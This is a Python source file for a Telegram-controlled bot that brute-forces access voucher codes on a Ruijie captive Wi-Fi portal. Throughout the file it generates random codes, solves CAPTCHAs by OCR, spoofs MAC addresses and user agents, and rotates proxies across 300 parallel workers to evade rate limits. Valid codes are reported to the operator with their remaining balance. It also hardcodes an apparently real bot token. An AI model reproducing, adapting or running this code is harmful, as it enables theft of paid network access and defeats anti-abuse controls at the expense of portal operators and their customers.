#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 sirzipp.py  —  ⚡ SAGE ⚡
 Starlink (Ruijie) Voucher Scanner + Telegram Bot   |   Telegram @Htun
--------------------------------------------------------------------------------
 GitHub license system ကို ဖြုတ်ပြီး ကုဒ်ကျမြနါအောင် ပြင်ဆင်ထားသည်။
 Requires:
     pip install aiohttp aiohttp-socks ddddocr python-telegram-bot requests
================================================================================
"""

import os
import sys
import re
import json
import time
import random
import string
import hashlib
import asyncio
import datetime
import requests

from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType

import ddddocr

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ==============================================================================
#  CONFIG / CONSTANTS
# ==============================================================================

BOT_TOKEN = "8902917967:AAGV_4oG7lsFx7HXGlVYmiLaiCHXUbS8orw"
ADMIN_IDS = [8338810698]

FILE_PATH = "allinone.txt"            # valid (HIT) codes are appended here
LAST_RUN_FILE = "last_run.txt"        # anti time-rollback watchdog
PROXY_FILE = "proxies.txt"            # proxy list
PORTAL_URL_PATH = "portal_url_"       # per-user portal url: portal_url_<uid>.txt

MAX_CODES_PER_SESSION = 30            # codes per aiohttp session (proxy rotate)
MAX_CODES_PER_SID = 30                # codes per gateway sessionId
NUM_WORKERS = 300                     # parallel workers
TIMEOUT_SEC = 30                      # per-request timeout

DEFAULT_EXPIRY = "2099-12-31 23:59:59"

# --- Ruijie Starlink portal endpoints ---------------------------------------
PORTAL_BASE = "https://portal-as.ruijienetworks.com"
PORTAL_INDEX = PORTAL_BASE + "/download/static/maccauth/src/index.html"
PORTAL_BALANCE_PAGE = PORTAL_BASE + "/download/static/maccauth/src/balance.html?sessionId="
VOUCHER_URL = PORTAL_BASE + "/api/auth/voucher/?lang=en_US"
CAPTCHA_IMAGE_URL = PORTAL_BASE + "/api/auth/captcha/image"
CAPTCHA_VERIFY_URL = PORTAL_BASE + "/api/auth/captcha/verify"
BALANCE_API = PORTAL_BASE + "/api/auth/balance/getBalance/"

# --- code char sets ---------------------------------------------------------
CHARSET_DIGITS = "012345678"
CHARSET_ABC = "abcdefghijkmnpqrstuvwxyz"
CHARSET_MIX = "2345678abcdefghijkmnpqrstuvwxyz"

MODES = {
    "num6": "Number 6",
    "num7": "Number 7",
    "num8": "Number 8",
    "num9": "Number 9",
    "mix6": "Mix 6",
    "abc6": "ABC 6",
    "custom": "Custom Start",
}

# --- terminal colors --------------------------------------------------------
bred = "\x1b[1;31m"
bgreen = "\x1b[1;32m"
bcyan = "\x1b[1;36m"
white = "\x1b[37m"
yellow = "\x1b[33m"
reset = "\x1b[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
]

# --- globals ----------------------------------------------------------------
_ocr_instance = None
_proxy_manager = None
user_scanners = {}      # user_id -> scanner-state dict


# ==============================================================================
#  BANNER
# ==============================================================================

def show_banner():
    line = "=" * 60
    print(bcyan + line)
    print("   ⚡ SAGE  ⚡   ")
    print("        Telegram @Htun     ")
    print(line + reset)


def check_time_integrity():
    """Refuse to run if system clock was rolled back (writes a datetime stamp)."""
    now = datetime.datetime.now()
    last_run_time = None
    if os.path.exists(LAST_RUN_FILE):
        try:
            with open(LAST_RUN_FILE) as f:
                raw_text = f.read().strip()
            if raw_text:
                last_run_time = datetime.datetime.strptime(raw_text, "%Y-%m-%d %H:%M:%S")
        except (OSError, ValueError):
            last_run_time = None
    if last_run_time and now < last_run_time:
        print(bred + "[!] ERROR: TIME ROLLBACK DETECTED! STOPPING..." + reset)
        sys.exit(1)
    try:
        with open(LAST_RUN_FILE, "w") as f:
            f.write(now.strftime("%Y-%m-%d %H:%M:%S"))
    except OSError:
        pass


# ==============================================================================
#  PROXY MANAGER
# ==============================================================================

class ProxyManager:
    """Round-robin SOCKS/HTTP proxy pool with bad-proxy marking."""

    def __init__(self, file_path):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = []
        self.lock = asyncio.Lock()
        self.index = 0
        self.load()

    def _normalize(self, proxy):
        proxy = (proxy or "").strip()
        if not proxy:
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "socks5://" + proxy
        return proxy

    def load(self):
        try:
            with open(self.file_path) as f:
                raw = [self._normalize(p) for p in f.read().splitlines()]
            self.proxies = [p for p in raw if p]
            random.shuffle(self.proxies)
            self.bad_proxies = []
            print(f"[ProxyManager] Loaded {len(self.proxies)} active proxies")
        except Exception as e:
            print(f"[ProxyManager] Load error: {e}")

    def reload(self):
        self.load()

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return p

    async def mark_bad(self, proxy):
        if not proxy:
            return
        async with self.lock:
            if proxy in self.proxies:
                self.proxies = [p for p in self.proxies if p != proxy]
                self.bad_proxies.append(proxy)

    def stats(self):
        total = len(self.proxies) + len(self.bad_proxies)
        bad = len(self.bad_proxies)
        return total, bad


def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager


def create_connector_for_proxy(proxy):
    try:
        return ProxyConnector.from_url(proxy)
    except Exception:
        return None


# ==============================================================================
#  OCR / CAPTCHA
# ==============================================================================

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    ocr = get_ocr_instance()
    result = ocr.classification(image_bytes)
    return result


async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        async with session.get(captcha_url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as resp:
            image_content = await resp.read()
        return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        return None


# ==============================================================================
#  USER DATA
# ==============================================================================

def get_user_data(user_id: int):
    """Return the portal URL saved for this user (or None)."""
    p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
    saved_url = None
    if os.path.exists(p_file):
        try:
            with open(p_file) as f:
                saved_url = f.read().strip()
        except OSError:
            saved_url = None
    return saved_url


def generate_random_mac():
    return ":".join("%02x" % random.randint(0, 255) for _ in range(6))


def build_headers(referer=PORTAL_INDEX):
    return {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json; charset=utf-8",
        "user-agent": random.choice(USER_AGENTS),
        "x-requested-with": "XMLHttpRequest",
        "Origin": PORTAL_BASE,
        "Referer": referer,
    }


# ==============================================================================
#  GATEWAY / SESSION
# ==============================================================================

async def get_sid_from_gateway(session, portal_url, user_id):
    """
    Load the portal login page, follow its JS `location.href=...` chain and
    return the gateway sessionId (and the final landing URL).
    """
    current_url = portal_url
    try:
        for _ in range(3):
            async with session.get(current_url, headers=build_headers(current_url),
                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                                   ssl=False, allow_redirects=True) as resp:
                body = await resp.text()
                final_url = str(resp.url)

            match = re.search(r"location\.href\s*=\s*[\'\"]([^\'\"]+)[\'\"]", body)
            if match:
                current_url = urljoin(final_url, match.group(1))
                continue

            token_match = re.search(r"token=([^&\s\"\'<>]+)", body)
            if token_match:
                current_url = urljoin(final_url, current_url.split("?")[0] + "?token=" + token_match.group(1))
            break

        parsed_query = parse_qs(urlparse(current_url).query)
        sid = parsed_query.get("sessionId", [None])[0]
        if not sid:
            token_match = re.search(r"token=([^&\s\"\'<>]+)", current_url)
            if token_match:
                sid = token_match.group(1)
        return sid, current_url
    except Exception:
        return None, None


# ==============================================================================
#  BALANCE
# ==============================================================================

async def fetch_balance(active_token: str, code: str, proxy: str) -> str:
    """Fetch profile name + remaining minutes for a HIT code."""
    connector = create_connector_for_proxy(proxy) if proxy else None
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            balance_url = BALANCE_API + "?sessionId=" + str(active_token) + "&lang=en_US"
            async with session.get(balance_url, headers=build_headers(),
                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                                   ssl=False) as resp:
                if resp.status != 200:
                    return f"❌ HTTP {resp.status}"
                try:
                    data = await resp.json(content_type=None)
                except Exception as json_err:
                    return f"❌ JSON Error: {json_err}"
                profile_name = data.get("profileName", "N/A")
                total_minutes = data.get("totalMinutes", 0)
                return f"📏: {profile_name}, ⏰: {total_minutes}"
    except Exception:
        return "N/A"
    finally:
        if connector is not None:
            try:
                await connector.close()
            except Exception:
                pass


async def check_balance(active_token, code, user_id, proxy_str):
    """Report a HIT (with balance info) to the user and log it to file."""
    balance_str = "...fetching..."
    hit_str = f"✅ HIT: `{code}`\n{balance_str}"
    try:
        with open(FILE_PATH, "a") as f:
            f.write(code + "\n")
    except OSError:
        pass
    try:
        await proxy_str  # allow passing a coroutine/future for the proxy
    except TypeError:
        pass
    balance = await fetch_balance(active_token, code, proxy_str if isinstance(proxy_str, str) else None)
    hit_str = f"✅ HIT: `{code}`\n{balance}\n⚔️ Expired: N/A"
    return hit_str


# ==============================================================================
#  CORE CHECKER
# ==============================================================================

async def check_single_access_code(session, code, current_session_id,
                                   login_url, captcha_base_url, verify_url,
                                   headers, user_id, current_proxy):
    """
    Check one voucher code:
      1. GET captcha image (OCR via ddddocr)
      2. POST captcha/verify
      3. POST voucher login  ->  '"success":true' == HIT
    Returns a status string: 'hit' / 'limit' / 'bad' / 'net' / 'captcha'
    """
    try:
        captcha_url = captcha_base_url + str(int(time.time() * 1000))
        captcha_text = await solve_captcha_simple_async(session, captcha_url, headers)
        if not captcha_text:
            return "net"

        # --- captcha verify ---------------------------------------------------
        v_payload = {"authCode": captcha_text, "sessionId": current_session_id}
        async with session.post(verify_url, json=v_payload, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                                ssl=False) as v_resp:
            v_data = await v_resp.text()
        if '"success":true' not in v_data.replace(" ", ""):
            return "captcha"

        # --- voucher login ----------------------------------------------------
        mac = generate_random_mac()
        l_payload = {
            "accessCode": code,
            "authCode": captcha_text,
            "mac": mac,
            "apiVersion": "3.0.0",
        }
        async with session.post(login_url, json=l_payload, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                                ssl=False) as l_resp:
            body = await l_resp.text()

        body_snippet = body[:300]
        if '"success":true' in body.replace(" ", ""):
            # extract active token / sessionId for balance lookup
            active_token = current_session_id
            try:
                j = json.loads(body)
                active_token = j.get("sessionId") or j.get("token") or current_session_id
            except Exception:
                pass
            return "hit"

        if ("request limited" in body) or ("the number of sta exceeds the limit" in body):
            return "limit"

        return "bad"
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
        return "net"
    except asyncio.CancelledError:
        raise
    except Exception:
        return "net"


# ==============================================================================
#  WORKER / SCANNER
# ==============================================================================

def make_code(mode, start_digit=6, counter=None):
    if mode == "custom" and counter is not None:
        return str(counter).zfill(6)
    if mode == "num6":
        return "".join(random.choice(CHARSET_DIGITS) for _ in range(6))
    if mode == "num7":
        return "".join(random.choice(CHARSET_DIGITS) for _ in range(7))
    if mode == "num8":
        return "".join(random.choice(CHARSET_DIGITS) for _ in range(8))
    if mode == "num9":
        return "".join(random.choice(CHARSET_DIGITS) for _ in range(9))
    if mode == "mix6":
        return "".join(random.choice(CHARSET_MIX) for _ in range(6))
    if mode == "abc6":
        return "".join(random.choice(CHARSET_ABC) for _ in range(6))
    return "".join(random.choice(CHARSET_DIGITS) for _ in range(6))


async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    """One scanning worker: owns a proxied session, rotates SID/session."""
    pm = get_proxy_manager()
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    mode = state.get("mode", "num6")
    start_digit = state.get("start_digit", 6)
    tried_codes = state["tried_codes"]

    while not stop_event.is_set():
        proxy = await pm.get_next()
        connector = create_connector_for_proxy(proxy) if proxy else None
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
            headers={"user-agent": random.choice(USER_AGENTS)},
        )
        try:
            sid, _gateway = await get_sid_from_gateway(session, state["portal_url"], user_id)
            if not sid:
                await pm.mark_bad(proxy)
                state["net"] += 1
                await asyncio.sleep(1)
                continue

            codes_checked_this_sid = 0
            sid_failures = 0
            codes_checked_this_session = 0

            while (codes_checked_this_session < MAX_CODES_PER_SESSION
                   and codes_checked_this_sid < MAX_CODES_PER_SID
                   and not stop_event.is_set()):

                # ---- pick a code -------------------------------------------------
                for _ in range(20):
                    if mode == "custom":
                        state["counter"] += 1
                        code = make_code(mode, start_digit, state["counter"])
                    else:
                        code = make_code(mode, start_digit)
                    if code not in tried_codes:
                        break
                else:
                    break
                tried_codes.add(code)
                state["current_code"] = code

                result = await check_single_access_code(
                    session, code, sid,
                    login_url, captcha_base_url, verify_url,
                    headers, user_id, proxy,
                )
                codes_checked_this_sid += 1
                codes_checked_this_session += 1
                state["tried"] += 1

                if result == "hit":
                    state["hits"] += 1
                    state["hit_list"].append(code)
                    state["last_hit"] = code
                    state["recent_logs"].append(f"✅ HIT: {code}")
                    msg = await check_balance(sid, code, user_id, proxy)
                    try:
                        await state["context"].bot.send_message(
                            chat_id=user_id, text=msg, parse_mode=ParseMode.MARKDOWN)
                    except Exception:
                        pass
                    # fresh session after a hit
                    break

                elif result == "limit":
                    state["limits"] += 1
                    state["recent_logs"].append(f"⚠️ LIMIT: {code}")
                    break  # rotate SID

                elif result == "net":
                    state["net"] += 1
                    state["recent_logs"].append(f"❌ Net/Other: {code}")
                    sid_failures += 1
                    if sid_failures >= 3:
                        await pm.mark_bad(proxy)
                        break

                elif result == "captcha":
                    state["failed"] += 1

                else:
                    state["failed"] += 1

                await asyncio.sleep(0)
        except asyncio.CancelledError:
            raise
        except Exception:
            state["net"] += 1
        finally:
            try:
                await session.close()
            except Exception:
                pass
        if stop_event.is_set():
            break
        await asyncio.sleep(0.05)


async def live_dashboard_updater(context: "ContextTypes.DEFAULT_TYPE", user_id: int):
    """Periodically refresh the live stats dashboard message."""
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    dash_msg_id = state.get("dash_msg_id")
    pm = get_proxy_manager()
    try:
        while not stop_event.is_set():
            await asyncio.sleep(5)
            if stop_event.is_set():
                break
            elapsed = max(time.time() - state["start_time"], 1)
            speed_cpm = int(state["tried"] / elapsed * 60)
            total, bad = pm.stats()
            active = total - bad
            recent_logs = state["recent_logs"][-5:]
            last_log = recent_logs[-1] if recent_logs else "None yet"
            text = (
                "⚡ Scanner Running ⚡\n"
                "Thank for using By Telegram @sayarkn\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Tried: {state['tried']}\n"
                f"🔥 Hits: {state['hits']}\n"
                f"⚠️ Limits: {state['limits']}\n"
                f"❌ Net/Other: {state['net']}\n"
                f"⚡ Speed: {speed_cpm} c/m\n🔁 Proxies: {active}\n"
                f"🔥 Last: {state['last_hit'] or 'None yet'}\n"
                f"🎯 Current Code: {state['current_code'] or '-'}\n"
                f"📋 Last log: {last_log}"
            )
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=dash_msg_id, text=text)
            except Exception:
                pass
    except asyncio.CancelledError:
        raise


async def run_user_scanner(context: "ContextTypes.DEFAULT_TYPE", user_id: int):
    """Launch NUM_WORKERS workers + the live dashboard for one user."""
    if user_scanners.get(user_id, {}).get("running"):
        return
    portal_url = get_user_data(user_id) or PORTAL_INDEX

    state = {
        "running": True,
        "context": context,
        "portal_url": portal_url,
        "mode": context.user_data.get("selected_mode", "num6"),
        "start_digit": context.user_data.get("start_digit", 6),
        "counter": int(context.user_data.get("start_digit", 6)) * 100000,
        "stop_event": asyncio.Event(),
        "tried": 0, "hits": 0, "limits": 0, "net": 0, "failed": 0,
        "hit_list": [], "valid_codes": [], "tried_codes": set(),
        "recent_logs": [], "last_hit": None, "current_code": None,
        "start_time": time.time(),
    }
    user_scanners[user_id] = state

    pm = get_proxy_manager()
    total, bad = pm.stats()
    if total - bad <= 0:
        await context.bot.send_message(
            chat_id=user_id,
            text="⚠️ **No proxies loaded!**\n\n"
                 "📥 **Proxy စာသားကို ထည့်သွင်းဖို့ စောင့်ဆိုင်းပါသည်**",
            parse_mode=ParseMode.MARKDOWN)
        state["running"] = False
        return

    dash = await context.bot.send_message(chat_id=user_id,
                                          text="🔄 Initializing scanner dashboard...")
    state["dash_msg_id"] = dash.message_id

    headers = build_headers()
    tasks = [asyncio.create_task(
        worker(i, VOUCHER_URL,
               CAPTCHA_IMAGE_URL + "?sessionId=",
               CAPTCHA_VERIFY_URL, headers, user_id))
        for i in range(NUM_WORKERS)]
    tasks.append(asyncio.create_task(live_dashboard_updater(context, user_id)))
    state["tasks"] = tasks

    try:
        await state["stop_event"].wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

        elapsed = max(time.time() - state["start_time"], 1)
        speed_cpm = int(state["tried"] / elapsed * 60)
        total, bad = pm.stats()
        hit_str = "\n".join(state["hit_list"]) if state["hit_list"] else "None"
        final_text = (
            "🛑 Scanner Stopped/Finished\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🔋 Total Tried: {state['tried']}\n"
            f"🔥 Hits: {state['hits']}\n"
            f"⚡ Final Speed: {speed_cpm} c/m\n"
            f"🔁 Proxies: {total - bad}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📋 **All Hit Codes**:\n{hit_str}"
        )
        try:
            await context.bot.send_message(chat_id=user_id, text=final_text,
                                           parse_mode=ParseMode.MARKDOWN)
        except Exception:
            pass
        state["running"] = False


# ==============================================================================
#  TELEGRAM UI
# ==============================================================================

def get_main_menu_markup():
    keyboard = [
        [InlineKeyboardButton("🌐 Update Portal", callback_data="btn_update_portal")],
        [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu"),
         InlineKeyboardButton("➕ Add Proxies", callback_data="btn_add_proxies")],
        [InlineKeyboardButton("🚀 Start Scanner", callback_data="btn_start_scanner"),
         InlineKeyboardButton("🛑 Stop", callback_data="stop_scan")],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_mode_menu_markup():
    keyboard = [
        [InlineKeyboardButton("Number 6", callback_data="set_mode_num6"),
         InlineKeyboardButton("Number 7", callback_data="set_mode_num7")],
        [InlineKeyboardButton("Number 8", callback_data="set_mode_num8"),
         InlineKeyboardButton("Number 9", callback_data="set_mode_num9")],
        [InlineKeyboardButton("Mix 6", callback_data="set_mode_mix6"),
         InlineKeyboardButton("Custom Start", callback_data="set_mode_custom")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")],
    ]
    return InlineKeyboardMarkup(keyboard)


def admin_only(func):
    async def wrapper(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
        user = update.effective_user
        if not user or user.id not in ADMIN_IDS:
            await update.effective_message.reply_text(
                "⛔ Bot ကို အလွန်အကျွံ အသုံးမပြုပါနဲ့။ "
                "အလွန်အကျွံ အသုံးပြုရင် telegram @sayarkn ဆီ ရင်းပါ")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


async def start(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
    user_id = update.effective_user.id
    mode = context.user_data.get("selected_mode", "num6")
    saved_url = get_user_data(user_id)
    pm = get_proxy_manager()
    total, bad = pm.stats()
    if saved_url:
        text = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
                f"🔁 Proxies: `{total - bad}`\n"
                "🌐 Portal: ready ✅")
    else:
        text = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
                f"🔁 Proxies: `{total - bad}`\n"
                "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ")
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=get_main_menu_markup())


@admin_only
async def add_proxies_cmd(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
    context.user_data["waiting_for_proxy_text"] = True
    await update.message.reply_text(
        "📥 **Proxy စာသားကို ထည့်သွင်းဖို့ စောင့်ဆိုင်းပါသည်**\n"
        "အောက်ပါ format နဲ့ proxy အားလုံး\n"
        "ဥပမာ -\n"
        "123.45.67.89:8080\n"
        "socks5://user:pass@host:1080\n"
        "socks4://host:1080",
        parse_mode=ParseMode.MARKDOWN)


async def handle_callbacks(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
    query = update.callback_query
    user_id = update.effective_user.id
    data = query.data
    await query.answer()

    mode = context.user_data.get("selected_mode", "num6")
    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad

    if data.startswith("set_mode_"):
        new_mode = data[len("set_mode_"):]
        context.user_data["selected_mode"] = new_mode
        mode = new_mode
        if new_mode == "custom":
            context.user_data["waiting_for_digit"] = True
            await query.edit_message_text(
                "🔢 **Start Digit **\nစတင်မည့် ဂဏန်းကို ပြောင်းရန် လိုအပ်ပါ",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("⬅️ Back", callback_data="btn_mode_menu")]]))
            return
        await query.edit_message_text(
            f"✅ Mode ပြောင်းဖို့ ပြုလုပ်ပြီးပါပြီ\n\n"
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())

    elif data == "btn_update_portal":
        context.user_data["waiting_for_portal_url"] = True
        await query.edit_message_text(
            "🌐 **Portal URL မရှိသေးပါ ထည့်ဖို့ လိုအပ်ပါ**\n"
            "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
            parse_mode=ParseMode.MARKDOWN)

    elif data == "btn_mode_menu":
        await query.edit_message_text("⚙️ **Choose Scanner Mode**",
                                      parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=get_mode_menu_markup())

    elif data == "btn_add_proxies":
        context.user_data["waiting_for_proxy_text"] = True
        await query.edit_message_text(
            "📥 **Proxy စာသားကို ထည့်သွင်းဖို့ စောင့်ဆိုင်းပါသည်**\n"
            "အောက်ပါ format နဲ့ proxy အားလုံး\nဥပမာ -\n"
            "123.45.67.89:8080\nsocks5://user:pass@host:1080\nsocks4://host:1080",
            parse_mode=ParseMode.MARKDOWN)

    elif data == "btn_start_scanner":
        await query.edit_message_text("🚀 Scanner စတင်ပါပြီ...")
        asyncio.get_event_loop().create_task(run_user_scanner(context, user_id))

    elif data == "stop_scan":
        state = user_scanners.get(user_id)
        if state and not state["stop_event"].is_set():
            state["stop_event"].set()
            await query.edit_message_text("🛑 Scanner ရပ်တန့်ပါပြီ")
        else:
            await query.edit_message_text("ℹ️ Scanner မလည်ပါနေပါ")

    elif data == "btn_back_main":
        saved_url = get_user_data(user_id)
        portal_line = "🌐 Portal: ready ✅" if saved_url else \
            "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ"
        await query.edit_message_text(
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{active}`\n{portal_line}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())


async def handle_text(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
    user_id = update.effective_user.id
    raw_text = (update.message.text or "").strip()
    pm = get_proxy_manager()
    mode = context.user_data.get("selected_mode", "num6")

    # ---- waiting for portal URL --------------------------------------------
    if context.user_data.get("waiting_for_portal_url"):
        context.user_data["waiting_for_portal_url"] = False
        if not raw_text.lower().startswith(("http://", "https://")):
            await update.message.reply_text(
                "❌ မှားနေတဲ့ URL ဖြစ်နိုင်ပါတယ် http/https URL ပြောင်းဖို့ လိုအပ်ပါ")
            return
        try:
            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                f.write(raw_text)
        except OSError:
            pass
        total, bad = pm.stats()
        await update.message.reply_text(
            "✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ\n\n"
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{total - bad}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    # ---- waiting for proxy list --------------------------------------------
    if context.user_data.get("waiting_for_proxy_text"):
        context.user_data["waiting_for_proxy_text"] = False
        lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
        if not lines:
            await update.message.reply_text(
                "❌ Proxy list အလွတ်မရေးပါနဲ့ အနည်းဆုံးတစ်ကြောင်းထည့်ပါ")
            return
        try:
            with open(PROXY_FILE, "a") as f:
                f.write("\n".join(lines) + "\n")
            pm.reload()
        except OSError as e:
            await update.message.reply_text(f"❌ Proxy ဖော်မက်မှားနေပါတယ် အများဆုံး: {e}")
            return
        total, bad = pm.stats()
        await update.message.reply_text(
            "✅ **Proxies ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ**\n"
            f"📊 Total: `{total}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    # ---- waiting for custom start digit ------------------------------------
    if context.user_data.get("waiting_for_digit"):
        context.user_data["waiting_for_digit"] = False
        if not raw_text.isdigit():
            await update.message.reply_text(
                "❌ ဂဏန်းပဲ ထည့်ပါ (0-9)")
            return
        context.user_data["start_digit"] = int(raw_text[0])
        total, bad = pm.stats()
        await update.message.reply_text(
            f"✅ Custom Start Digit = `{raw_text[0]}` ပြောင်းဖို့ ပြုလုပ်ပြီးပါပြီ\n\n"
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{total - bad}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    # ---- default: show panel -------------------------------------------------
    saved_url = get_user_data(user_id)
    total, bad = pm.stats()
    portal_line = "🌐 Portal: ready ✅" if saved_url else \
        "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ"
    await update.message.reply_text(
        "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
        f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
        f"🔁 Proxies: `{total - bad}`\n{portal_line}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup())


# ==============================================================================
#  MAIN
# ==============================================================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addproxies", add_proxies_cmd))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callbacks))

    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad
    print(f"[MAIN] Proxy Manager initialized: {total}/{active} active proxies")

    print("Bot is running with python-telegram-bot...")
    app.run_polling(drop_pending_updates=True)
    print("Thank for using By Telegram@sayarkn")


# ==============================================================================
#  ENTRY POINT
# ==============================================================================

show_banner()
check_time_integrity()
_proxy_manager = get_proxy_manager()

if __name__ == "__main__":
    main()
